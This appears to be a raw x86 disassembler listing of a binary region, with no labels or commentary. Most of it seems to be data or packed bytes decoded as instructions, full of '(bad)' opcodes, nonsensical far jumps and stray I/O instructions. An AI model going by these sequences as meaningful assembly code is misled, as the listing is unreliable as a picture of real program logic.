  4487eb:	or     ebp,DWORD PTR [ecx]
  4487ed:	cld    
  4487ee:	das    
  4487ef:	aas    
  4487f0:	sub    esp,edi
  4487f2:	daa    
  4487f3:	xor    ebp,DWORD PTR [ecx]
  4487f5:	cld    
  4487f6:	pop    ds
  4487f7:	arpl   WORD PTR [ecx],bp
  4487f9:	cld    
  4487fa:	pop    ss
  4487fb:	jecxz  0x44884a
  4487fd:	cld    
  4487fe:	pmullw mm1,QWORD PTR [ebp-0x4]
  448802:	add    BYTE PTR [eax],al
  448804:	add    BYTE PTR [eax],al
  448806:	add    BYTE PTR [edi],al
  448808:	leave  
  448809:	or     al,0x0
  44880b:	nop
  44880c:	dec    ebp
  44880d:	sub    ah,bh
  44880f:	test   DWORD PTR [edx+0x28],0x287eeffc
  448816:	cld    
  448817:	out    0xc8,eax
  448819:	or     al,0x0
  44881b:	nop
  44881c:	ror    DWORD PTR [eax+eax*1],1
  44881f:	adc    BYTE PTR [edx+0x329003f5],dh
  448825:	fiadd  WORD PTR [ebx]
  448827:	nop
  448828:	xor    bh,cl
  44882a:	add    edx,DWORD PTR [eax-0x6ffc08ce]
  448830:	mov    dl,0x6f
  448832:	xor    DWORD PTR [esi+edx*8-0x295bce8c],ebp
  448839:	nop
  44883a:	xor    DWORD PTR [esi+edx*8-0x4d6ffc0a],ebx
  448841:	and    DWORD PTR [edx],esi
  448843:	mov    esi,ss
  448845:	xor    al,BYTE PTR ss:[esi+edx*8+0x329003f0]
  44884d:	pop    es
  44884e:	xor    dh,BYTE PTR [esi+edx*8-0x10]
  448852:	xor    DWORD PTR [esi+edx*8-0x8],ebp
  448856:	xor    DWORD PTR [esi+edx*8-0x5e],esp
  44885a:	das    
  44885b:	pop    esp
  44885c:	(bad)  
  44885d:	shr    BYTE PTR [edi],cl
  44885f:	push   esp
  448860:	(bad)  
  448861:	mov    al,ds:0x6cd64c2f
  448866:	das    
  448867:	inc    esp
  448868:	(bad)  
  448869:	pop    edx
  44886a:	das    
  44886b:	add    BYTE PTR [eax],al
  44886d:	add    BYTE PTR [eax],al
  44886f:	add    BYTE PTR [esi+edx*8],bh
  448872:	pop    esi
  448873:	das    
  448874:	xor    al,0xd6
  448876:	pusha  
  448877:	das    
  448878:	sub    al,0xd6
  44887a:	je     0x4488ab
  44887c:	and    al,0xd6
  44887e:	call   0xeb1aa4b1
  448883:	cs adc al,0xd6
  448886:	(bad)  
  448887:	cs or  al,0xd6
  44888a:	mov    ds:0x6d6042e,al
  44888f:	das    
  448890:	cld    
  448891:	aad    0xfa
  448893:	cs hlt 
  448895:	aad    0xf8
  448897:	cs in  al,dx
  448899:	aad    0x24
  44889b:	xor    ah,ah
  44889d:	aad    0xd
  44889f:	pop    ss
  4488a0:	mov    al,ds:0xa019e8d6
  4488a5:	(bad)  
  4488a6:	call   0xe91b08d6
  4488ab:	dec    ebp
  4488ac:	adc    dh,0xe8
  4488af:	jne    0x448831
  4488b1:	(bad)  
  4488b2:	call   0xe91aef84
  4488b7:	jmp    0xf9533b4f
  4488bc:	popa   
  4488bd:	(bad)  
  4488be:	call   0xe91aeada
  4488c3:	daa    
  4488c4:	(bad)  
  4488c5:	(bad)  
  4488c6:	call   0xe91b4a68
  4488cb:	jmp    0xe3533b63
  4488d0:	leave  
  4488d1:	(bad)  
  4488d2:	call   0x4489a4
  4488d7:	add    BYTE PTR [eax],al
  4488d9:	into   
  4488da:	(bad)  
  4488db:	call   0xe91b5fb7
  4488e0:	lahf   
  4488e1:	into   
  4488e2:	(bad)  
  4488e3:	call   0xe91b5f8b
  4488e8:	jae    0x4488b8
  4488ea:	(bad)  
  4488eb:	call   0xe91b5f3f
  4488f0:	jge    0x4488c0
  4488f2:	(bad)  
  4488f3:	call   0xe91b5f59
  4488f8:	pop    ss
  4488f9:	iret   
  4488fa:	(bad)  
  4488fb:	call   0xe91b600b
  448900:	ret    
  448901:	into   
  448902:	(bad)  
  448903:	call   0xe91b5fcb
  448908:	ror    esi,1
  44890a:	(bad)  
  44890b:	call   0xe91adffd
  448910:	sbb    DWORD PTR [ecx-0x2a],0xffffffe8
  448914:	or     DWORD PTR [ecx-0x2a],0xffffffe8
  448918:	and    eax,0xe8d649
  44891d:	mov    ch,0x6b
  44891f:	jmp    0xf5ff:0xea6babff
  448926:	imul   ebp,edx,0xea69c7ff
  44892c:	(bad)  
  44892d:	jmp    0x448998
  44892f:	jmp    0x9bff:0xea69fbff
  448936:	push   0xffffffea
  448938:	jmp    DWORD PTR [edi+0xffea6a]
  44893e:	add    BYTE PTR [eax],al
  448940:	add    BYTE PTR [eax],al
  448942:	add    DWORD PTR [edx-0x16],ebp
  448945:	call   FWORD PTR [edi]
  448947:	push   0xffffffea
  448949:	jmp    FWORD PTR ds:0x3bffea6a
  44894f:	push   0xffffffea
  448951:	call   DWORD PTR [edi]
  448953:	ins    BYTE PTR es:[edi],dx
  448954:	jmp    0x21ff:0xea6c21ff
  44895b:	ins    BYTE PTR es:[edi],dx
  44895c:	jmp    0xc9ff:0xea6c31ff
  448963:	popf   
  448964:	jmp    0x9dff:0xea9dedff
  44896b:	popf   
  44896c:	jmp    0x8fff:0xea6c4bff
  448973:	popf   
  448974:	jmp    0x61ff:0xea9d83ff
  44897b:	lahf   
  44897c:	jmp    0x25ff:0xea9f51ff
  448983:	lahf   
  448984:	jmp    0x15ff:0xea9f11ff
  44898b:	lahf   
  44898c:	jmp    0xc9ff:0xea9f07ff
  448993:	sahf   
  448994:	jmp    0x90ff:0xea9ebbff
  44899b:	xor    eax,0x2bf7fc22
  4489a0:	and    bh,ah
  4489a2:	out    dx,eax
  4489a3:	jae    0x4489c7
  4489a5:	cld    
  4489a6:	add    BYTE PTR [eax],al
  4489a8:	add    BYTE PTR [eax],al
  4489aa:	add    bh,ah
  4489ac:	mov    ds:0x7dffc50,eax
  4489b1:	push   ebx
  4489b2:	cld    
  4489b3:	xlat   BYTE PTR ds:[ebx]
  4489b4:	and    eax,0x39cffc53
  4489b9:	push   ebx
  4489ba:	cld    
  4489bb:	(bad)  
  4489bc:	sbb    eax,0xb5bffc50
  4489c1:	push   esi
  4489c2:	cld    
  4489c3:	mov    bh,0xa9
  4489c5:	push   esi
  4489c6:	cld    
  4489c7:	scas   eax,DWORD PTR es:[edi]
  4489c8:	mov    bh,0x56
  4489ca:	cld    
  4489cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4489cc:	xchg   ebp,eax
  4489cd:	push   esi
  4489ce:	cld    
  4489cf:	lahf   
  4489d0:	jno    0x448a28
  4489d2:	cld    
  4489d3:	xchg   edi,eax
  4489d4:	jnp    0x448a2c
  4489d6:	cld    
  4489d7:	pop    DWORD PTR [ebx+0x1d]
  4489da:	cld    
  4489db:	xchg   DWORD PTR [ebx+0x22],edi
  4489de:	cld    
  4489df:	jg     0x448a44
  4489e1:	and    bh,ah
  4489e3:	ja     0x448982
  4489e5:	and    bh,ah
  4489e7:	outs   dx,DWORD PTR ds:[esi]
  4489e8:	inc    ebp
  4489e9:	push   ecx
  4489ea:	cld    
  4489eb:	adc    DWORD PTR [bp-0x4],0xfc56c15f
  4489f3:	push   edi
  4489f4:	mov    edx,DWORD PTR [esi-0x4]
  4489f7:	dec    edi
  4489f8:	int    0x50
  4489fa:	cld    
  4489fb:	inc    edi
  4489fc:	call   DWORD PTR [eax-0x4]
  4489ff:	aas    
  448a00:	loope  0x448a52
  448a02:	cld    
  448a03:	aaa    
  448a04:	rcl    DWORD PTR [eax-0x4],1
  448a07:	das    
  448a08:	cmp    eax,0xf27fc54
  448a0d:	push   esp
  448a0e:	cld    
  448a0f:	add    BYTE PTR [eax],al
  448a11:	add    BYTE PTR [eax],al
  448a13:	add    BYTE PTR [edi],bl
  448a15:	adc    DWORD PTR [esp+edi*8+0x17],edx
  448a19:	mov    eax,ds:0xb20ffc54
  448a1e:	jge    0x448a6a
  448a20:	add    al,0xd3
  448a22:	mov    cs,WORD PTR [edx-0x4]
  448a25:	shl    BYTE PTR [esi+0x4a],cl
  448a28:	hlt    
  448a29:	rcr    al,cl
  448a2b:	dec    edx
  448a2c:	in     al,dx
  448a2d:	shl    BYTE PTR [edx+ecx*2+0x4ad6d2e4],cl
  448a34:	(bad)  
  448a36:	mov    edx,0xe0d2d433
  448a3b:	xor    ecx,esp
  448a3d:	sar    BYTE PTR [ebx+esi*1+0x340cd2c4],cl
  448a44:	mov    esp,0xb433f2d2
  448a49:	rcr    BYTE PTR [eax],cl
  448a4b:	inc    esi
  448a4c:	lods   al,BYTE PTR ds:[esi]
  448a4d:	sar    BYTE PTR [eax+0x45],cl
  448a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448a51:	rcr    BYTE PTR [edx+ecx*2+0x4aa0d29c],cl
  448a58:	xchg   esp,eax
  448a59:	ror    ah,cl
  448a5b:	dec    edx
  448a5c:	mov    edx,ss
  448a5e:	call   0xf5170eab
  448a63:	dec    eax
  448a64:	jl     0x448a38
  448a66:	enter  0x744a,0xd2
  448a6a:	into   
  448a6b:	dec    edx
  448a6c:	ins    BYTE PTR es:[edi],dx
  448a6d:	ror    BYTE PTR [eax+0x1cd26445],cl
  448a73:	inc    edi
  448a74:	pop    esp
  448a75:	rcr    BYTE PTR [eax+0x33],cl
  448a78:	add    BYTE PTR [eax],al
  448a7a:	add    BYTE PTR [eax],al
  448a7c:	add    BYTE PTR [edx+edx*8-0xa],dl
  448a80:	add    edx,DWORD PTR [eax+0x44383fb2]
  448a86:	shl    BYTE PTR [eax+0x38],cl
  448a89:	cmp    al,0xd2
  448a8b:	jbe    0x448ac5
  448a8d:	xor    al,0xd2
  448a8f:	test   BYTE PTR [ebx],0x90
  448a92:	mov    dl,0x5
  448a94:	cmp    DWORD PTR [edx+edx*8],esp
  448a97:	stos   BYTE PTR es:[edi],al
  448a98:	cmp    BYTE PTR [edx+edx*8],bl
  448a9b:	or     eax,0xe8ce58c5
  448aa0:	ror    eax,1
  448aa2:	into   
  448aa3:	call   0xe913550f
  448aa8:	push   ebx
  448aa9:	mov    edx,0xba3de8ce
  448aae:	into   
  448aaf:	call   0xe91334dd
  448ab4:	xchg   ebp,eax
  448ab5:	stos   BYTE PTR es:[edi],al
  448ab6:	into   
  448ab7:	call   0xe913251f
  448abc:	outs   dx,DWORD PTR ds:[esi]
  448abd:	call   0xeb2:0x93e9e8ce
  448ac4:	xor    DWORD PTR [esi+ecx*8-0x4d6c0418],eax
  448acb:	mov    ?,edi
  448acd:	xchg   ebx,eax
  448ace:	mov    dl,0x8e
  448ad0:	xchg   ebp,eax
  448ad1:	xchg   ebx,eax
  448ad2:	mov    dl,0x8e
  448ad4:	fst    DWORD PTR [ebx-0x6c14714e]
  448ada:	mov    dl,0x8e
  448adc:	ficom  WORD PTR [ebx+0x318eb2]
  448ae2:	add    BYTE PTR [eax],al
  448ae4:	add    BYTE PTR [eax],al
  448ae6:	int3   
  448ae7:	into   
  448ae8:	call   0x8ef71747
  448aed:	outs   dx,DWORD PTR ds:[esi]
  448aee:	mov    edx,0xba6be8ce
  448af3:	into   
  448af4:	call   0xe9133636
  448af9:	sbb    eax,0x2be8ceab
  448afe:	fwait
  448aff:	into   
  448b00:	call   0x8ef71ee1
  448b05:	stc    
  448b06:	mov    cl,dh
  448b08:	call   0x8ef71efb
  448b0d:	add    edi,DWORD PTR [ebx-0x32]
  448b10:	call   0xe9130602
  448b15:	xchg   ebx,eax
  448b16:	imul   ecx,esi,0xffffffe8
  448b19:	add    BYTE PTR [ecx+0x2affea8d],ch
  448b1f:	mov    ch,0xe
  448b21:	cmp    BYTE PTR [edx],0xb5
  448b24:	push   cs
  448b25:	sub    ah,0xb4
  448b28:	push   cs
  448b29:	cmp    al,0xb4
  448b2c:	push   cs
  448b2d:	or     dh,0xb4
  448b30:	push   cs
  448b31:	sbb    cl,0xb4
  448b34:	push   cs
  448b35:	xor    ah,0xb4
  448b38:	push   cs
  448b39:	add    ch,0xb4
  448b3c:	push   cs
  448b3d:	xor    bh,0xb4
  448b40:	push   cs
  448b41:	cmp    BYTE PTR [eax-0x587ff14c],0x8d
  448b48:	jmp    0x0:0xff
  448b4f:	mov    ch,0xb4
  448b51:	push   cs
  448b52:	sub    BYTE PTR [ecx-0x22fff14c],0x87
  448b59:	jmp    0xa7ff:0xea88adff
  448b60:	mov    dl,ch
  448b62:	jmp    FWORD PTR [ecx-0x4c001578]
  448b68:	mov    dl,ch
  448b6a:	jmp    DWORD PTR [ebp-0x78]
  448b6d:	jmp    0xa3ff:0xea8299ff
  448b74:	sub    dl,0xff
  448b77:	xchg   ebp,eax
  448b78:	sub    dl,0xff
  448b7b:	lahf   
  448b7c:	sub    dl,0xff
  448b7f:	mov    eax,ds:0x7bffea82
  448b84:	sub    dl,0xff
  448b87:	leave  
  448b88:	sub    dl,0xff
  448b8b:	pop    DWORD PTR [edx-0x4bc60016]
  448b91:	push   cs
  448b92:	add    bh,ch
  448b94:	sub    dl,0xff
  448b97:	nop
  448b98:	push   ebx
  448b99:	push   edx
  448b9a:	cld    
  448b9b:	das    
  448b9c:	js     0x448bf0
  448b9e:	cld    
  448b9f:	daa    
  448ba0:	mov    dl,0x52
  448ba2:	cld    
  448ba3:	pop    ds
  448ba4:	fimul  DWORD PTR [eax+eax*1]
  448ba7:	nop
  448ba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448ba9:	and    eax,0x25960ffc
  448bae:	cld    
  448baf:	pop    es
  448bb0:	call   0x4587d8
  448bb5:	add    BYTE PTR [eax],al
  448bb7:	add    bh,bh
  448bb9:	stos   DWORD PTR es:[edi],eax
  448bba:	and    eax,0x23c7f7fc
  448bbf:	cld    
  448bc0:	out    dx,eax
  448bc1:	out    dx,eax
  448bc2:	and    edi,esp
  448bc4:	out    0x5b,eax
  448bc6:	and    eax,0x2553dffc
  448bcb:	cld    
  448bcc:	xlat   BYTE PTR ds:[ebx]
  448bcd:	xor    eax,0xd9cffc25
  448bd2:	or     al,0x0
  448bd4:	nop
  448bd5:	and    cl,BYTE PTR ds:0x542b3444
  448bdb:	pop    ebp
  448bdc:	cmp    al,0x1d
  448bde:	or     DWORD PTR [eax+ebx*2+0x3a],esp
  448be2:	das    
  448be3:	pop    esp
  448be4:	xor    al,0x3e
  448be6:	or     eax,0x11f9183
  448beb:	push   ecx
  448bec:	sbb    eax,0xd979033e
  448bf1:	dec    edi
  448bf2:	aaa    
  448bf3:	add    ah,BYTE PTR [bx+0x33]
  448bf7:	ins    BYTE PTR es:[edi],dx
  448bf8:	jmp    0x294b87d
  448bfd:	jns    0x448c30
  448bff:	pop    ebp
  448c00:	jecxz  0x448c6e
  448c02:	adc    ch,BYTE PTR [eax+edx*4-0x7b]
  448c06:	ss jb  0x448bd5
  448c09:	xor    BYTE PTR [ebx],0x5c
  448c0c:	int3   
  448c0d:	jne    0x448c3d
  448c0f:	add    BYTE PTR [eax-0x4ba3f971],dl
  448c15:	mov    dl,0x3
  448c17:	loop   0x448bf4
  448c19:	pop    esi
  448c1a:	sbb    eax,DWORD PTR [eax+eax*1]
  448c1d:	add    BYTE PTR [eax],al
  448c1f:	add    BYTE PTR [eax],al
  448c21:	aas    
  448c22:	mov    ah,0x38
  448c24:	sub    DWORD PTR [esi+eiz*2+0x78a02112],edi
  448c2b:	(bad)  
  448c2c:	pop    ds
  448c2d:	mov    ebp,0xb5211680
  448c32:	test   DWORD PTR [bp+di],0x1d31b117
  448c39:	outs   dx,BYTE PTR ds:[esi]
  448c3a:	push   esi
  448c3b:	mov    ecx,0xc343821c
  448c40:	dec    ecx
  448c41:	imul   ebx,DWORD PTR [esi-0x26],0x31b2903a
  448c48:	add    edx,DWORD PTR [ebx+0x44]
  448c4b:	fisub  DWORD PTR [esp+ebp*2]
  448c4e:	push   ebp
  448c4f:	mov    bl,0x1c
  448c51:	bound  edx,QWORD PTR [ebp-0x2c]
  448c54:	pop    ss
  448c55:	aaa    
  448c56:	inc    esp
  448c57:	sahf   
  448c58:	cmp    dl,BYTE PTR [eax+0x4e0841b2]
  448c5e:	pop    ecx
  448c5f:	test   DWORD PTR [edi],edx
  448c61:	and    eax,0x22499351
  448c66:	push   ebp
  448c67:	xchg   edx,eax
  448c68:	add    esp,DWORD PTR [ecx+0x291588b4]
  448c6e:	inc    esi
  448c6f:	xchg   edx,eax
  448c70:	dec    ecx
  448c71:	sub    DWORD PTR [esi-0x66],ebx
  448c74:	add    edx,esi
  448c76:	mov    al,0xb0
  448c78:	sub    ah,dh
  448c7a:	je     0x448cba
  448c7c:	and    ch,bl
  448c7e:	jae    0x448cc3
  448c80:	sbb    BYTE PTR [edx],al
  448c82:	pop    esp
  448c83:	push   ebp
  448c84:	pop    ss
  448c85:	add    BYTE PTR [eax],al
  448c87:	add    BYTE PTR [eax],al
  448c89:	add    ah,bh
  448c8b:	push   edi
  448c8c:	inc    esp
  448c8d:	cmp    DWORD PTR [eax-0x3df7d04e],edx
  448c93:	push   edi
  448c94:	push   esi
  448c95:	sub    BYTE PTR [esi+0x77450e5b],dl
  448c9b:	mov    dl,0xe
  448c9d:	xchg   edi,eax
  448c9e:	mov    WORD PTR [ecx+0x5c],?
  448ca1:	or     al,0x73
  448ca3:	pop    esi
  448ca4:	jae    0x448ccd
  448ca6:	fwait
  448ca7:	push   esi
  448ca8:	jae    0x448ce8
  448caa:	xchg   esp,eax
  448cab:	mov    bl,0xd
  448cad:	outs   dx,DWORD PTR es:[esi]
  448caf:	pop    esi
  448cb0:	inc    edx
  448cb1:	or     al,0x7f
  448cb3:	inc    edx
  448cb4:	or     BYTE PTR ds:[eax+0x5a],bh
  448cb8:	inc    ecx
  448cb9:	jmp    0x26510c51
  448cbe:	scas   eax,DWORD PTR es:[edi]
  448cbf:	pop    esi
  448cc0:	push   eax
  448cc1:	rcr    BYTE PTR [edi-0x7a2fc291],1
  448cc7:	outs   dx,DWORD PTR ds:[esi]
  448cc8:	push   ebx
  448cc9:	rcl    DWORD PTR [ebx-0x7548ece7],1
  448ccf:	inc    eax
  448cd0:	bound  edi,QWORD PTR [edx+esi*4+0x77cd4f56]
  448cd7:	push   ebp
  448cd8:	ins    DWORD PTR es:[edi],dx
  448cd9:	jmp    0xa753db71
  448cde:	stos   BYTE PTR es:[edi],al
  448cdf:	push   esp
  448ce0:	jb     0x448c8c
  448ce2:	lahf   
  448ce3:	push   ebp
  448ce4:	pop    ebp
  448ce5:	test   BYTE PTR [ebx+0x76bb1213],dl
  448ceb:	push   edi
  448cec:	jns    0x448c85
  448cee:	add    BYTE PTR [eax],al
  448cf0:	add    BYTE PTR [eax],al
  448cf2:	add    BYTE PTR [esi-0x72],ch
  448cf5:	ja     0x448d72
  448cf7:	jbe    0x448d4a
  448cf9:	bound  ecx,QWORD PTR [esi-0x16beb483]
  448cff:	xchg   ebx,eax
  448d00:	sub    DWORD PTR [edi],ecx
  448d02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448d03:	stos   BYTE PTR es:[edi],al
  448d04:	push   esp
  448d05:	jb     0x448d3e
  448d07:	mov    bh,0x4a
  448d09:	bound  esp,QWORD PTR [edi]
  448d0b:	fwait
  448d0c:	push   esi
  448d0d:	jae    0x448d4d
  448d0f:	xchg   esp,eax
  448d10:	xor    al,0xe
  448d12:	sub    dh,BYTE PTR [eax-0x33ffa2ab]
  448d18:	mov    gs,WORD PTR [edi+0x6e]
  448d1b:	int    0x92
  448d1d:	dec    ebx
  448d1e:	add    BYTE PTR [edx],bh
  448d20:	mov    ah,0x3d
  448d22:	gs jge 0x448d9d
  448d25:	ja     0x448d93
  448d27:	mov    WORD PTR [ecx+0x7a],?
  448d2a:	je     0x448cc7
  448d2c:	test   eax,0x958d756c
  448d31:	pop    ebp
  448d32:	push   edi
  448d33:	cmp    DWORD PTR [ecx-0x4193fea1],esi
  448d39:	pop    esi
  448d3a:	popa   
  448d3b:	xchg   DWORD PTR [edx-0x57f091d5],ebx
  448d41:	pop    esp
  448d42:	outs   dx,DWORD PTR ds:[esi]
  448d43:	pop    es
  448d44:	lods   al,BYTE PTR ds:[esi]
  448d45:	dec    ebx
  448d46:	outs   dx,BYTE PTR ds:[esi]
  448d47:	fld    QWORD PTR [ebp-0x6d1f8d86]
  448d4d:	dec    ecx
  448d4e:	jae    0x448d7e
  448d50:	mov    cl,0x2
  448d52:	push   es
  448d53:	and    eax,0x727aa6
  448d58:	add    BYTE PTR [eax],al
  448d5a:	add    BYTE PTR [eax],al
  448d5c:	lds    edx,FWORD PTR [ebx-0x4f16be90]
  448d62:	add    eax,DWORD PTR [esi]
  448d64:	aad    0xa5
  448d66:	jp     0x448dda
  448d68:	add    eax,0xa9577094
  448d6d:	mov    al,0xd3
  448d6f:	add    esp,ebp
  448d71:	xchg   ecx,eax
  448d72:	ins    DWORD PTR es:[edi],dx
  448d73:	popa   
  448d74:	adc    eax,0xc655c7b
  448d79:	mov    cl,0x53
  448d7b:	add    esp,ecx
  448d7d:	xchg   ebx,eax
  448d7e:	outs   dx,DWORD PTR ds:[esi]
  448d7f:	jo     0x448d69
  448d81:	lods   al,BYTE PTR ds:[esi]
  448d82:	jb     0x448df3
  448d84:	sbb    dh,BYTE PTR [eax-0x6acefcc1]
  448d8a:	outs   dx,DWORD PTR ds:[esi]
  448d8b:	jo     0x448d3c
  448d8d:	mov    al,ds:0xb069654b
  448d92:	pop    DWORD PTR [edx]
  448d94:	nop
  448d95:	pushf  
  448d96:	aaa    
  448d97:	ins    BYTE PTR es:[edi],dx
  448d98:	aad    0x8c
  448d9a:	ss ins DWORD PTR es:[edi],dx
  448d9c:	in     al,dx
  448d9d:	jle    0x448dc9
  448d9f:	popa   
  448da0:	out    0x75,al
  448da2:	cs pop ebp
  448da4:	out    0xd9,eax
  448da6:	or     al,0x5d
  448da8:	xchg   ebx,eax
  448da9:	xchg   edx,eax
  448daa:	or     BYTE PTR [ecx-0x3c],ch
  448dad:	mov    ds:0x8fa96433,al
  448db2:	aaa    
  448db3:	inc    ebx
  448db4:	mov    ds:0xb36906b2,al
  448db9:	mov    edx,0xb8b5532e
  448dbe:	push   es
  448dbf:	imul   eax,DWORD PTR [eax],0x0
  448dc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448dc6:	mov    ebx,0x91935012
  448dcb:	aaa    
  448dcc:	popa   
  448dcd:	adc    BYTE PTR [ebp-0x187b8cc9],0x7
  448dd4:	jns    0x448d66
  448dd6:	sbb    al,0xc
  448dd8:	dec    eax
  448dd9:	jne    0x448dd5
  448ddb:	cld    
  448ddc:	inc    edx
  448ddd:	(bad)  
  448dde:	div    BYTE PTR [ecx]
  448de0:	ins    BYTE PTR es:[edi],dx
  448de1:	jne    0x448dbc
  448de3:	or     al,0x6a
  448de5:	xchg   edx,eax
  448de6:	adc    al,0x36
  448de8:	ins    BYTE PTR es:[edi],dx
  448de9:	pop    esp
  448dea:	cli    
  448deb:	sti    
  448dec:	imul   ecx,DWORD PTR [ebp+0x7],0xffffffff
  448df0:	inc    dx
  448df2:	(bad)  [edi+ecx*1]
  448df5:	lea    ecx,[eax]
  448df7:	ss ins BYTE PTR es:[edi],dx
  448df9:	pop    esp
  448dfa:	cmp    bh,ah
  448dfc:	imul   ecx,DWORD PTR [ebp+0x27],0xffffffff
  448e00:	data16 and bl,cl
  448e03:	or     al,0xad
  448e05:	xchg   edx,eax
  448e06:	adc    al,0x36
  448e08:	ins    BYTE PTR es:[edi],dx
  448e09:	loopne 0x448e52
  448e0b:	or     BYTE PTR [ebx-0x2f],ah
  448e0e:	xor    eax,0xb2f57231
  448e13:	inc    esp
  448e14:	adc    edx,DWORD PTR [eax-0x53fb164e]
  448e1a:	push   ebp
  448e1b:	push   ebx
  448e1c:	sub    esp,esi
  448e1e:	push   ebp
  448e1f:	xor    al,0x12
  448e21:	jmp    0xf167cc6c
  448e26:	pop    esi
  448e27:	add    al,0x29
  448e29:	add    BYTE PTR [eax],al
  448e2b:	add    BYTE PTR [eax],al
  448e2d:	add    BYTE PTR [ebx-0x51e0b1ba],dh
  448e33:	mov    dl,0x20
  448e35:	add    eax,0x2903597e
  448e3a:	les    ebx,FWORD PTR [ecx+0x1a]
  448e3d:	sub    esp,ebx
  448e3f:	pop    ebx
  448e40:	cmp    ebx,DWORD PTR [edi]
  448e42:	mov    ds:0xbd181676,eax
  448e47:	data16 (bad) 
  448e49:	and    BYTE PTR [ebp-0x33fb5c4e],dh
  448e4f:	pop    ebx
  448e50:	in     al,0x47
  448e52:	jno    0x448e9a
  448e54:	adc    bh,BYTE PTR [eax]
  448e56:	imul   ebx,DWORD PTR [ebp-0x26],0xbe746f37
  448e5d:	pop    ds
  448e5e:	dec    ebp
  448e5f:	data16 into 
  448e61:	and    BYTE PTR [ebp-0x4e],al
  448e64:	out    0x5,eax
  448e66:	je     0x448ea7
  448e68:	stos   DWORD PTR es:[edi],eax
  448e69:	adc    DWORD PTR [ebx+0x5d],esi
  448e6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448e6d:	inc    esp
  448e6e:	nop
  448e6f:	mov    dl,0xbe
  448e71:	add    eax,0x11a33f2c
  448e76:	xor    eax,DWORD PTR [edx-0x52]
  448e79:	sbb    eax,0x46fb251
  448e7e:	outs   dx,BYTE PTR ds:[esi]
  448e7f:	inc    eax
  448e80:	call   0x3111:0x95594c28
  448e87:	inc    eax
  448e88:	mov    es,WORD PTR [ebx]
  448e8a:	shr    DWORD PTR [esi+0x4ef11ebb],cl
  448e90:	push   cs
  448e91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448e92:	add    BYTE PTR [eax],al
  448e94:	add    BYTE PTR [eax],al
  448e96:	add    BYTE PTR [esp+edx*2+0x4ba1885c],ah
  448e9d:	inc    ecx
  448e9e:	jmp    0x2753d936
  448ea3:	mov    ecx,DWORD PTR [esi+0x73]
  448ea6:	cmp    eax,0x35734f8b
  448eab:	jge    0x448f1b
  448ead:	jns    0x448ef9
  448eaf:	mov    bl,0x4e
  448eb1:	push   eax
  448eb2:	push   eax
  448eb3:	jo     0x448f1c
  448eb5:	inc    edx
  448eb6:	inc    eax
  448eb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448eb8:	addr16 push cs
  448eba:	(bad)  
  448ebb:	xchg   ebp,eax
  448ebc:	dec    esi
  448ebd:	pop    ebp
  448ebe:	sbb    eax,0x205e55a2
  448ec3:	gs mov dl,0xe
  448ec6:	dec    DWORD PTR [ebp-0x7deaa2b2]
  448ecc:	push   ebp
  448ecd:	pop    esi
  448ece:	add    bl,dl
  448ed0:	mov    dl,0xe
  448ed2:	jmp    0x448e64
  448ed4:	mov    DWORD PTR [ebx-0x3],esi
  448ed7:	mov    edi,0xb3045c5a
  448edc:	dec    bp
  448ede:	(bad)  
  448edf:	xchg   ebp,eax
  448ee0:	push   esi
  448ee1:	jae    0x448ec4
  448ee3:	xchg   DWORD PTR [edx+0x658f100e],esi
  448ee9:	jae    0x448ec0
  448eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448eec:	pop    edx
  448eed:	pop    esp
  448eee:	int3   
  448eef:	mov    dl,0x66
  448ef1:	dec    ebp
  448ef2:	into   
  448ef3:	lods   eax,DWORD PTR ds:[esi]
  448ef4:	push   esi
  448ef5:	jae    0x448ea8
  448ef7:	lahf   
  448ef8:	mov    dl,0xe
  448efa:	jle    0x448efc
  448efc:	add    BYTE PTR [eax],al
  448efe:	add    BYTE PTR [eax],al
  448f00:	xchg   edi,eax
  448f01:	js     0x448f7a
  448f03:	fwait
  448f04:	lahf   
  448f05:	push   edi
  448f06:	outs   dx,DWORD PTR ds:[esi]
  448f07:	lea    edx,[ebp+0x44]
  448f0a:	jae    0x448e98
  448f0c:	dec    esi
  448f0d:	dec    edx
  448f0e:	push   cs
  448f0f:	dec    ebp
  448f10:	xchg   edx,eax
  448f11:	mov    DWORD PTR [ebx+0x0],esi
  448f14:	adc    eax,0x1a6f5c85
  448f19:	nop
  448f1a:	pop    ebp
  448f1b:	jae    0x448f4d
  448f1d:	xchg   ecx,eax
  448f1e:	push   cs
  448f1f:	add    BYTE PTR [ecx],ch
  448f21:	mov    dl,0x29
  448f23:	ins    BYTE PTR es:[edi],dx
  448f24:	ficom  WORD PTR [edi+ebp*2+0x6da7bd6c]
  448f2b:	imul   edi,DWORD PTR [ecx-0x4b],0xfffffffe
  448f2f:	add    dh,BYTE PTR [esi-0x3fab856f]
  448f35:	xchg   ebx,eax
  448f36:	jne    0x448f7b
  448f38:	fisub  WORD PTR [ecx-0x4ac68b90]
  448f3e:	mov    ds:0x6f919d03,eax
  448f43:	jbe    0x448ec9
  448f45:	jae    0x448fa3
  448f47:	imul   eax,DWORD PTR [ebp-0x729e9253],0x85634b83
  448f51:	lods   eax,DWORD PTR ds:[esi]
  448f52:	jno    0x448fc2
  448f54:	sub    DWORD PTR [ebp-0x6d49fcd7],esi
  448f5a:	jno    0x448fbe
  448f5c:	cwde   
  448f5d:	xchg   edx,eax
  448f5e:	pop    ebx
  448f5f:	outs   dx,BYTE PTR ds:[esi]
  448f60:	std    
  448f61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448f62:	ins    DWORD PTR es:[edi],dx
  448f63:	imul   eax,DWORD PTR [eax],0x0
  448f66:	add    BYTE PTR [eax],al
  448f68:	add    cl,ch
  448f6a:	mov    ah,0x4e
  448f6c:	add    DWORD PTR [edi+eiz*4],esi
  448f6f:	jp     0x448fd6
  448f71:	retf   
  448f72:	jno    0x448fd0
  448f74:	imul   eax,ebp,0xbd616dab
  448f7a:	or     DWORD PTR [ebx+0x63],0x6e71ac05
  448f81:	mov    ecx,0x2605c3b4
